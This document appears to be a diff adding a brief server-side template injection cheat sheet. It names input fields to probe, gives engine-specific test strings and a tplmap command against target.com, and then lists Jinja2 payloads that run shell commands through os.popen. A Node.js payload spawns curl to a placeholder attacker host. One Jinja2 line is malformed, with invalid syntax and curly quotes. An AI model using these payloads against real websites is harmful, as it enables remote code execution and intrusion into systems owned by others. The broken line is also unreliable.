@@ -1,0 +1,33 @@
+🌚 Step 1: Find the Right Input Field
+First, you need to find a place where the website uses your input and shows it back to you. Good places to test are:
+Sign-up/Registration forms (for your username)
+Contact forms:
+Support tickets:
+"Edit profile" pages:
+Search bars (if the results page shows your search term):
+
+{{7*7}}              # Jinja2, Twig, Handlebars
+${7*7}               # JSP / Spring
+<%= 7*7 %>           # ERB (Ruby)
+#{7*7}               # Jade / Pug
+((7*7))              # Velocity
+
+★ Automation Tools
+tplmap -u http://target.com/page?name=INJECT_HERE
+
+🌚 Step 2: Jinja2 payloads :
+{{ ''.__class__.__base__.__subclasses__()[189].__init__.__globals__['sys'].modules['os'].popen("id").read() }}
+{{ import os ; os.system(‘id’)}}
+{{ '' .__class__ .__base__ .__subclasses__()[141] .__init__ .__globals__['sys'] .modules['os'] .popen("id") .read() }}
+{{ [].class.base.subclasses() }} # get all classes
+{{''.class.mro()[1].subclasses()}}
+{%for c in [1,2,3] %}{{c,c,c}}{% endfor %}
+
+
+{{ this }} -> [Object Object]
+{{ this.__proto__ }} --> [Object Object]
+{{ this.__proto__.constructor.name }} --> Object
+process.mainModule.constructor._load('child_process').exec('curl http://[ip]:[port]/'); 
+
+
+
